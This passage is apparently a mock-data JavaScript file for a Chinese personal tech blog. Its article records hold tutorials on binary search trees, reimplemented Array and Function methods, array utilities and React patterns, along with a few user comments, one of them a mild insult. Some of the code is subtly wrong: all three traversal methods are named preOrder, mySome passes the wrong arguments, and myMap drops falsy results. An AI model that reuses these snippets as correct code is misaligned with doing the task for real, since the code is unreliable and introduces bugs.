*/\n```\n\n### 实现3\n\n> 待定\n\n# 选择排序\n\n> [看另一篇文章](https://www.zhengbeining.com/article/64)\n\n# 插入排序\n\n> [看另一篇文章](https://www.zhengbeining.com/article/65)\n\n',
      click: 76,
      createdAt: '2021-02-18T08:00:34.000Z',
      updatedAt: '2021-02-18T19:33:19.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 63,
            article_id: 63,
            type_id: 3,
            createdAt: '2021-02-18T08:00:34.000Z',
            updatedAt: '2021-02-18T08:00:34.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 63,
            user_id: 1,
            article_id: 63,
            createdAt: '2021-02-18T08:00:34.000Z',
            updatedAt: '2021-02-18T08:00:34.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 62,
      title: '二叉搜索树',
      is_comment: 1,
      status: 1,
      img: '/1613580157990二叉搜索树.png',
      content:
        '# 二叉树（Binary tree）\n\n# 二叉搜索树（Binary Search Tree）\n\n## 什么是二叉搜索数？\n\n> 二叉搜索树，又成二叉查找树，二叉排序树。\n\n若任意结点的左子树不空，则左子树上所有结点的值都不大于它的根结点的值。\n\n若任意结点的右子树不空，则右子树上所有结点的值都不小于它的根结点的值。\n\n任意结点的左、右子树也分别为二叉搜索树\n\n## 复杂度\n\n如果有n个元素，则复杂度为：O(logn)\n\n## 方法\n\n### 插入\n\n```js\n// 二叉搜索树（Binary Search Tree）\nfunction BinarySearchTree() {\n\n    // 节点对象类\n    function Node(key) {\n        this.key = key\n        this.left = null\n        this.right = null\n    }\n    // 属性\n    this.root = null\n\n    // 方法1：插入\n    BinarySearchTree.prototype.insert = function (key) {\n        // 先根据key创建节点\n        var newNode = new Node(key)\n        if (this.root == null) {\n            this.root = newNode\n        } else {\n            insertNode(this.root, newNode)\n        }\n\n        function insertNode(node, newNode) {\n            if (node.key > newNode.key) {\n                // 两个节点对比，如果新节点比对比的节点小，则向左查找\n                if (node.left == null) {\n                    // 如果左边没有节点，直接把新节点给左边的节点\n                    node.left = newNode\n                } else {\n                    // 如果左边有节点，再次比较左节点和新节点的大小\n                    insertNode(node.left, newNode)\n                }\n            } else {\n                // 如果新节点比对比的节点大，则向右查找\n                if (node.right == null) {\n                    // 如果右边没有节点，直接把新节点给右边的节点\n                    node.right = newNode\n                } else {\n                    // 如果右边有节点，再次比较右节点和新节点的大小\n                    insertNode(node.right, newNode)\n                }\n            }\n        }\n    }\n}\n\nvar bst = new BinarySearchTree()\nbst.insert(11)\nbst.insert(7)\nbst.insert(15)\nbst.insert(5)\nbst.insert(3)\nbst.insert(9)\n// ...\nconsole.log(bst)\n```\n\n### 查找\n\n> 树的遍历\n\n#### 先序查找\n\n> 遍历过程：\n>\n> 1. 访问根节点\n> 2. 先序遍历左节点\n> 3. 先序遍历右节点\n\n```js\n// 先序遍历\nBinarySearchTree.prototype.preOrder = function (cb) {\n    preOrderNode(this.root, cb)\n\n    function preOrderNode(node, cb) {\n        if (node != null) {\n            cb(node)\n            preOrderNode(node.left, cb)\n            preOrderNode(node.right, cb)\n        }\n    }\n}\n```\n\n#### 中序查找\n\n```js\n// 中序遍历\nBinarySearchTree.prototype.preOrder = function (cb) {\n    preOrderNode(this.root, cb)\n\n    function preOrderNode(node, cb) {\n        if (node != null) {\n            preOrderNode(node.left, cb)\n            cb(node)\n            preOrderNode(node.right, cb)\n        }\n    }\n}\n```\n\n#### 后序查找\n\n```js\n// 后序遍历\nBinarySearchTree.prototype.preOrder = function (cb) {\n    preOrderNode(this.root, cb)\n\n    function preOrderNode(node, cb) {\n        if (node != null) {\n            preOrderNode(node.left, cb)\n            preOrderNode(node.right, cb)\n            cb(node)\n        }\n    }\n}\n```\n\n### 搜索\n\n#### 最大值\n\n```js\n// 最大值\nBinarySearchTree.prototype.max = function () {\n    var node = this.root\n    var res\n    while (node != null) {\n        res = node\n        node = node.right\n    }\n    return res\n}\n```\n\n#### 最小值\n\n```js\n// 最小值\nBinarySearchTree.prototype.min = function () {\n    var node = this.root\n    var res\n    while (node != null) {\n        res = node\n        node = node.left\n    }\n    return res\n}\n```\n\n#### 指定值\n\n```js\n// 指定值，给一个key，查找对应的节点，如果找到，返回对应节点，找不到返回false\nBinarySearchTree.prototype.search = function (key) {\n    var node = this.root\n    var res = false\n    while (node != null) {\n        // 如果传进来的key比对比的节点key值大，则向右查找\n        if (node.key < key) {\n            node = node.right\n        } else if (node.key > key) {\n            node = node.left\n        } else {\n            return node\n        }\n    }\n    return res\n}\n```\n\n',
      click: 42,
      createdAt: '2021-02-17T16:42:41.000Z',
      updatedAt: '2021-02-20T00:56:24.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 62,
            article_id: 62,
            type_id: 3,
            createdAt: '2021-02-17T16:42:41.000Z',
            updatedAt: '2021-02-17T16:42:41.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 62,
            user_id: 1,
            article_id: 62,
            createdAt: '2021-02-17T16:42:41.000Z',
            updatedAt: '2021-02-17T16:42:41.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 61,
      title: '重写常用原生方法',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# 重写call\n\n```js\nFunction.prototype.myCall = function (ctx) {\n    // 不考虑严格模式下的undefined\n    ctx = Object(ctx) || window\n    // 谁调用方法，this就指向谁，比如这里的myCall是test调用的，this就是test\n    // 给ctx添加一个属性originFn，让他指向this，也就是test\n    // 如果执行originFn()，也就是执行test()，而它是ctx调用的，所以this就是ctx\n    ctx.originFn = this\n    var args = []\n    for (var i = 1; i < arguments.length; i++) {\n        args.push('arguments[' + i + ']')\n    }\n    var res = eval('ctx.originFn(' + args + ')')\n    delete ctx.originFn\n    return res\n}\n\n```\n\n\n\n# 重写apply\n\n```js\n/* \n    apply:\n    第一个参数：this\n    第二个参数：\n        数组，实参列表；\n        null，undefined，对象，函数不报错；\n        原始值报错；\n    第三至最后一个参数忽略\n*/\nFunction.prototype.myApply = function (ctx, arg1) {\n    // 不考虑严格模式下的undefined\n    ctx = Object(ctx) || window\n    ctx.originFn = this\n    var args = []\n    // var arg1 = arguments[1]\n\n    function myTypeof(v) {\n        return typeof (v) === 'object' ? {\n            '[object Object]': 'Object',\n            '[object Array]': 'Array',\n            '[object Number]': 'Number',\n            '[object String]': 'String',\n            '[object Boolean]': 'Boolean',\n        }[({}).toString.call(v)] : typeof (v)\n    }\n    if (typeof (arg1) != 'undefined' && typeof (arg1) != 'object' && typeof (arg1) != 'function') {\n        throw new Error('Uncaught TypeError: CreateListFromArrayLike called on non-object')\n    }\n    if (!arg1 || myTypeof(arg1) != 'Array') {\n        return ctx.originFn()\n    }\n    for (var i = 0; i < arg1.length; i++) {\n        args.push('arg1[' + i + ']')\n    }\n\n    var res = eval('ctx.originFn(' + args + ')')\n    delete ctx.originFn\n    return res\n}\n        \n```\n\n\n\n# 重写bind\n\n```\n\n```\n\n\n\n# 重写foreach\n\n```js\nArray.prototype.myForEach = function (cb) {\n    var _arr = this\n    var _this = arguments[1] || window\n    for (var i = 0; i < _arr.length; i++) {\n        cb.apply(_this, [_arr[i], i, _arr])\n    }\n}\n\n```\n\n\n\n# 重写map\n\n```js\nArray.prototype.myMap = function (cb) {\n    var _arr = this\n    var _this = arguments[1] || window\n    var _newArr = []\n    var _res\n    for (var i = 0; i < _arr.length; i++) {\n        _res = cb.apply(_this, [_arr[i], i, _arr])\n        _res && _newArr.push(_res)\n    }\n    return _newArr\n}\n\n```\n\n\n\n# 重写filter\n\n```js\nArray.prototype.myFilter = function (cb) {\n    var _arr = this\n    var _this = arguments[1] || window\n    var _newArr = []\n    for (var i = 0; i < _arr.length; i++) {\n        var _res = cb.apply(_this, [_arr[i], i, _arr])\n        _res && _newArr.push(_arr[i])\n    }\n    return _newArr\n}\n\n```\n\n\n\n# 重写reduce\n\n```\n\n```\n\n\n\n# 重写some\n\n```js\nArray.prototype.mySome = function (cb) {\n    var _arr = this\n    var _this = arguments[1] || window\n    // var _res = false\n    for (var i = 0; i < _arr.length; i++) {\n        if (cb(_this, [_arr[i], i, _arr])) {\n            // _res = true\n            // break\n            return true\n        }\n    }\n    // return _res\n    return false\n}\n\n```\n\n\n\n# 重写every\n\n```js\nArray.prototype.myEvery = function (cb) {\n    var _arr = this\n    var _this = arguments[1] || window\n    // var _res = true\n    for (var i = 0; i < _arr.length; i++) {\n        if (!cb.apply(_this, [_arr[i], i, _arr])) {\n            // _res = false\n            // break\n            return false\n        }\n    }\n    // return _res\n    return true\n}\n\n```",
      click: 50,
      createdAt: '2021-02-14T16:32:22.000Z',
      updatedAt: '2021-02-20T04:37:02.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 61,
            article_id: 61,
            type_id: 1,
            createdAt: '2021-02-14T16:32:22.000Z',
            updatedAt: '2021-02-14T16:32:22.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 61,
            user_id: 1,
            article_id: 61,
            createdAt: '2021-02-14T16:32:22.000Z',
            updatedAt: '2021-02-14T16:32:22.000Z',
          },
        },
      ],
      comments: [
        {
          id: 19,
          article_id: 61,
          from_user_id: 24,
          to_comment_id: -1,
          to_user_id: -1,
          content: '哈哈哈哈',
          createdAt: '2021-03-17T12:58:45.000Z',
          updatedAt: '2021-03-17T12:58:45.000Z',
        },
        {
          id: 20,
          article_id: 61,
          from_user_id: 24,
          to_comment_id: 19,
          to_user_id: 24,
          content: '你是傻逼',
          createdAt: '2021-03-17T12:58:58.000Z',
          updatedAt: '2021-03-17T12:58:58.000Z',
        },
        {
          id: 21,
          article_id: 61,
          from_user_id: 12,
          to_comment_id: 19,
          to_user_id: 24,
          content: '为啥要自怼啊',
          createdAt: '2021-03-17T13:41:25.000Z',
          updatedAt: '2021-03-17T13:41:25.000Z',
        },
      ],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 60,
      title: '新年快乐，0 error，0 warning',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '0 error，0 warning！\n![happynewyear.png](https://img.cdn.hsslive.cn/1613124192576happynewyear.png)',
      click: 51,
      createdAt: '2021-02-12T10:14:52.000Z',
      updatedAt: '2021-02-12T10:14:52.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 60,
            article_id: 60,
            type_id: 3,
            createdAt: '2021-02-12T10:14:52.000Z',
            updatedAt: '2021-02-12T10:14:52.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 60,
            user_id: 1,
            article_id: 60,
            createdAt: '2021-02-12T10:14:52.000Z',
            updatedAt: '2021-02-12T10:14:52.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 59,
      title: '小破站运行520天了',
      is_comment: 1,
      status: 1,
      img: '/1612583739158Billd.jpg',
      content:
        '![520day.png](https://img.cdn.hsslive.cn/1612583705978520day.png)',
      click: 52,
      createdAt: '2021-02-06T03:55:37.000Z',
      updatedAt: '2021-02-16T11:29:52.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 59,
            article_id: 59,
            type_id: 3,
            createdAt: '2021-02-10T07:18:44.000Z',
            updatedAt: '2021-02-10T07:18:44.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 59,
            user_id: 1,
            article_id: 59,
            createdAt: '2021-02-06T04:27:54.000Z',
            updatedAt: '2021-02-06T04:27:56.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 58,
      title: '快放假了',
      is_comment: 1,
      status: 1,
      img: '/1612105185072zhuanzheng.jpg',
      content: '时间过得好快...',
      click: 46,
      createdAt: '2021-01-31T14:59:47.000Z',
      updatedAt: '2021-01-31T15:16:49.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 58,
            article_id: 58,
            type_id: 3,
            createdAt: '2021-01-31T15:16:56.000Z',
            updatedAt: '2021-01-31T15:16:56.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 58,
            user_id: 1,
            article_id: 58,
            createdAt: '2021-01-31T14:59:47.000Z',
            updatedAt: '2021-01-31T14:59:47.000Z',
          },
        },
      ],
      comments: [
        {
          id: 12,
          article_id: 58,
          from_user_id: 7,
          to_comment_id: -1,
          to_user_id: -1,
          content: 'hello',
          createdAt: '2021-02-06T01:17:36.000Z',
          updatedAt: '2021-02-06T01:17:36.000Z',
        },
        {
          id: 13,
          article_id: 58,
          from_user_id: 7,
          to_comment_id: 7,
          to_user_id: 12,
          content: '多少级评论呀\n',
          createdAt: '2021-02-06T01:17:52.000Z',
          updatedAt: '2021-02-06T01:17:52.000Z',
        },
        {
          id: 14,
          article_id: 58,
          from_user_id: 1,
          to_comment_id: 7,
          to_user_id: 12,
          content: '目前二级',
          createdAt: '2021-02-06T05:54:58.000Z',
          updatedAt: '2021-02-06T05:54:58.000Z',
        },
      ],
      tags: [],
    },
    {
      id: 57,
      title: '地区数据整理',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "## 地区数据整理\n\n```js\nvar oldArr = [\n    { province: '广东省', city: '广州市', district: '天河区' },\n    { province: '广东省', city: '广州市', district: '白云区' },\n    { province: '广东省', city: '东莞市', district: '常平镇' },\n    { province: '广东省', city: '东莞市', district: '虎门镇' },\n    { province: '广东省', city: '东莞市', district: '长安镇' },\n    { province: '广西省', city: '南宁市', district: '兴宁区' },\n    { province: '广西省', city: '南宁市', district: '江南区' },\n    { province: '海南省', city: '海口市', district: '琼山区' },\n    { province: '海南省', city: '三亚市', district: '海棠区' },\n    { province: '海南省', city: '三沙市', district: '南沙区' },\n]\nvar newArr = []\nvar item = {}   // 区\nvar item1 = {}  // 市\nfor (let i = 0; i < oldArr.length; i++) {\n    // 没有这个省的\n    if (!item[oldArr[i].province]) {\n        newArr.push({\n            name: oldArr[i].province,\n            children: [\n                {\n                    name: oldArr[i].city,\n                    children: [\n                        { name: oldArr[i].district }\n                    ],\n                }\n            ]\n        })\n        item[oldArr[i].province] = oldArr[i].province\n        item1[oldArr[i].city] = oldArr[i].city\n    } else {\n        // 遍历newArr，看看这个省的位置\n        for (let j = 0; j < newArr.length; j++) {\n            if (newArr[j].name == item[oldArr[i].province]) {\n                // 这个省没有这个市，就往省的children添加市\n                if (!item1[oldArr[i].city]) {\n                    if (newArr[j].name == item[oldArr[i].province]) {\n                        newArr[j].children.push({\n                            name: oldArr[i].city,\n                            children: [\n                                {\n                                    name: oldArr[i].district,\n                                }\n                            ],\n                        })\n                        item1[oldArr[i].city] = oldArr[i].city\n                    }\n                } else {\n                    // 有这个省有这个市了就往市里面的children添加区\n                    for (let x = 0; x < newArr[j].children.length; x++) {\n                        if (newArr[j].children[x].name == item1[oldArr[i].city]) {\n                            newArr[j].children[x].children.push({\n                                name: oldArr[i].district,\n                            })\n                        }\n                    }\n                }\n            }\n\n        }\n    }\n}\nconsole.log(newArr)\nconsole.log('item', item)\nconsole.log('item1', item1)\n```\n\n",
      click: 27,
      createdAt: '2020-10-19T17:11:59.000Z',
      updatedAt: '2020-12-20T15:06:38.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 57,
            article_id: 57,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 57,
            user_id: 1,
            article_id: 57,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 56,
      title: '常用utils',
      is_comment: 1,
      status: 1,
      img: '/1611638863309heiwukong.jpg',
      content:
        "## 数组最大最小值\n\n```js\nfunction min(nums) {\n    var res = nums[0]\n    for (var i = 0; i < nums.length; i++) {\n        if (res > nums[i]) {\n            res = nums[i]\n        }\n    }\n    return res\n}\nfunction max(nums) {\n    var res = nums[0]\n    for (var i = 0; i < nums.length; i++) {\n        if (res < nums[i]) {\n            res = nums[i]\n        }\n    }\n    return res\n}\nfunction getMax(nums) {\n    return Math.max.apply(null, nums)\n}\nfunction getMin(nums) {\n    return Math.min.apply(null, nums)\n}\nvar nums = [1, 12, 3, 4, 5, 0]\nconsole.log('最大值：', max(nums))\nconsole.log('最小值：', min(nums))\nconsole.log('最大值：', getMax(nums))\nconsole.log('最小值：', getMin(nums))\nconsole.log('最大值：', Math.max(...nums))\nconsole.log('最小值：', Math.min(...nums))\n```\n\n## 数组去重\n\n> es5\n\n```js\nvar arr2 = [1, 1, 'true', 'true', true, true, 15, 15, false, false, undefined, undefined, null, null, NaN, NaN, 'NaN', 0, 0, 'a', 'a', {}, {}];\n// es5常用\nfunction unique(arr) {\n    for (var i = 0; i < arr.length; i++) {\n        for (var j = i + 1; j < arr.length; j++) {\n            if (arr[i] == arr[j]) {         //第一个等同于第二个，splice方法删除第二个\n                arr.splice(j, 1);\n                j--;    // splice会修改原数组，删了一个后，下标要减一！\n            }\n        }\n    }\n    return arr;\n}\nconsole.log(unique(arr2))   // NaN和{}没有去重，两个null直接消失了\n```\n\n> es6\n\n```js\nvar arr2 = [1, 1, 'true', 'true', true, true, 15, 15, false, false, undefined, undefined, null, null, NaN, NaN, 'NaN', 0, 0, 'a', 'a', {}, {}];\nconsole.log(Array.from(new Set(arr2)));   // {}没有去重，两个null直接消失了\n```\n\n> indexOf去重\n\n```js\nvar arr2 = [1, 1, 'true', 'true', true, true, 15, 15, false, false, undefined, undefined, null, null, NaN, NaN, 'NaN', 0, 0, 'a', 'a', {}, {}];\nfunction unique1(arr) {\n    var newarr = [];\n    for (var i = 0; i < arr.length; i++) {\n        if (newarr.indexOf(arr[i]) == -1) {\n            newarr.push(arr[i])\n        }\n    }\n    return newarr\n}\nconsole.log(unique1(arr2)); // NaN和{}没有去重，两个null直接消失了\n```\n\n> 数组里面套对象的去重\n\n```js\nvar arr1 = [\n    { name: '张三' },\n    { name: '张三' },\n    { name: '李四' },\n    { name: '王五' },\n]\nfunction distinct1(arr, key) {\n    var newobj = {}, newArr = [];\n    for (var i = 0; i < arr.length; i++) {\n        var item = arr[i];\n        if (!newobj[item[key]]) {\n            newobj[item[key]] = newArr.push(item);\n        }\n    }\n    return newArr;\n}\nconsole.log(distinct1(arr1, 'name'));\n```\n\n## 冒泡排序\n\n## 互换两个变量位置\n\n## 原生实现call，applay，bind",
      click: 42,
      createdAt: '2020-10-14T17:59:36.000Z',
      updatedAt: '2020-12-22T14:53:10.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 56,
            article_id: 56,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 56,
            user_id: 1,
            article_id: 56,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [],
    },
    {
      id: 55,
      title: 'react事件传值',
      is_comment: 1,
      status: 1,
      img: '/1602681480226react.jpg',
      content:
        '# React\n\n### 父子组件传值\n\n#### 写法一：bind绑定this\n\n```jsx\nclass XiaojiejieItem extends Component {\n    render() {\n        return (\n            <li onClick={this.delItem.bind(this)}>{this.props.list}</li>\n        );\n    }\n    delItem() {\n        console.log(this.props.index)\n    }\n}\n```\n\n#### 写法二：构造函数\n\n```jsx\nclass XiaojiejieItem extends Component {\n    constructor(props){\n        super(props)\n    \tthis.delItem = this.delItem.bind(this)\n\n    }\n    render() {\n        return (\n            <li onClick={this.delItem}>{this.props.list}</li>\n        );\n    }\n    delItem(){\n        console.log(this.props.index)\n    }\n}\n\n```\n\n#### 写法三：箭头函数\n\n```jsx\nclass XiaojiejieItem extends Component {\n    render() {\n        return (\n            <li onClick={this.delItem}>{this.props.list}</li>\n        );\n    }\n    delItem = () => {\n        console.log(this.props.index)\n    }\n}\n```\n\n\n\n### onClick点击事件传参\n\n#### 写法一：bind绑定\n\n```jsx\n{this.state.list.map((item, index) => {\n    return (\n        <li key={index} onClick={this.delItem.bind(this, index)}>\n            {item}\n        </li>\n    )\n})}\n\ndelItem(e,index) {\n\tconsole.log(e,index)\n}\n```\n\n\n\n#### 写法二：箭头函数\n\n```jsx\n{this.state.list.map((item, index) => {\n    return (\n        <li key={index} onClick={() => { this.delItem(index) }}>\n            {item}\n        </li>\n    )\n})}\n\ndelItem(index) {\n\tconsole.log(index)\n}\n```\n\n',
      click: 24,
      createdAt: '2020-10-14T13:24:24.000Z',
      updatedAt: '2021-02-16T13:17:27.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 55,
            article_id: 55,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 55,
            user_id: 1,
            article_id: 55,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 54,
      title: 'react过渡动画',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# react-transition-group \n\n```bash\nnpm instrall react-transition-group \n```\n\n## CSSTransition\n\nCSSTransition执行过程中，有三个状态：appear、enter、exit\n\n它们有三种状态，需要定义对应的CSS样式： \n\n第一类，开始状态：对于的类是-appear、-enter、exit\n\n第二类：执行动画：对应的类是-appear-active、-enter-active、-exit-active\n\n第三类：执行结束：对应的类是-appear-done、-enter-done、-exit-done\n\n```react\nimport React, { PureComponent } from 'react'\nimport { CSSTransition } from 'react-transition-group';\nimport { Button } from 'antd';\nimport './CSSTransition.css'\n\nexport default class CSSTransitonDemo extends PureComponent {\n    constructor(props) {\n        super(props)\n        this.state = {\n            isShow: true\n        }\n    }\n    onChangeClick() {\n        this.setState({\n            isShow: !this.state.isShow\n        })\n    }\n    render() {\n        const { isShow } = this.state\n        return (\n            <div>\n                <Button type=\"primary\" onClick={() => this.onChangeClick()}>切换</Button>\n                <div>\n                    <CSSTransition\n                        in={isShow}\n                        classNames='avatar'\n                        timeout={1000}\n                        appear\n                    // unmountOnExit={true}\n                    >\n                        <img src=\"http://xsili-dev.oss-cn-shenzhen.aliyuncs.com/vl/img/6ae2ad9f7c3d4bc2bc8edb21c1a4b6d1.jpg\" width=\"50\"></img>\n                    </CSSTransition>\n                </div>\n\n            </div>\n        )\n    }\n}\n```\n\n> 过渡动画顺序：\n> 1，浏览器刷新，默认true，显示，首先添加avatar-apper，然后添加avatar-apper-acticve，显示动画结束后添加avatar-apper-done，同时，也添加avatar-enter-done\n>\n> 2，点击切换，为false，隐藏，首先添加avatar-exit，然后添加avatar-exit-active，最后隐藏动画结束后添加avatar-exit-done\n>\n> 3，再次点击切换，为true，显示，首先添加avatar-enter，然后添加avatar-enter-active，最后显示动画结束后添加avatar-enter-done\n\n## SwitchTransition\n\n## TransitionGroup",
      click: 31,
      createdAt: '2020-10-14T13:21:46.000Z',
      updatedAt: '2021-02-16T13:17:17.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 54,
            article_id: 54,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 54,
            user_id: 1,
            article_id: 54,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 53,
      title: 'react实现slot',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '## 实现1\n\n```react\nimport React, { Component } from \'react\';\n\nclass NavBar extends Component {\n  render() {\n    // this.props.children;\n    return (\n      <div className="nav-item nav-bar">\n        <div className="nav-left">\n          {this.props.children[0]}\n        </div>\n        <div className="nav-item nav-center">\n          {this.props.children[1]}\n        </div>\n        <div className="nav-item nav-right">\n          {this.props.children[2]}\n        </div>\n      </div>\n    )\n  }\n}\n\nexport default class App extends Component {\n\n  render() {\n    const leftJsx = <span>aaa</span>;\n    return (\n      <div>\n        <NavBar name="" title="" className="">\n          <span>aaa</span>\n          <strong>bbb</strong>\n          <a href="/#">ccc</a>\n        </NavBar>\n      </div>\n    )\n  }\n}\n```\n\n## 实现2\n\n```react\nimport React, { Component } from \'react\';\n\nclass NavBar2 extends Component {\n  render() {\n    const { leftSlot, centerSlot, rightSlot } = this.props;\n    return (\n      <div className="nav-item nav-bar">\n        <div className="nav-left">\n          {leftSlot}\n        </div>\n        <div className="nav-item nav-center">\n          {centerSlot}\n        </div>\n        <div className="nav-item nav-right">\n          {rightSlot}\n        </div>\n      </div>\n    )\n  }\n}\n\nexport default class App extends Component {\n\n  render() {\n    const leftJsx = <span>aaa</span>;\n    return (\n      <div>\n        <NavBar2\n          leftSlot={leftJsx}\n          centerSlot={<strong>bbb</strong>}\n          rightSlot={<a href="/#">ccc</a>} />\n      </div>\n    )\n  }\n}\n```\n\n',
      click: 35,
      createdAt: '2020-10-14T13:21:26.000Z',
      updatedAt: '2021-02-16T13:17:08.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
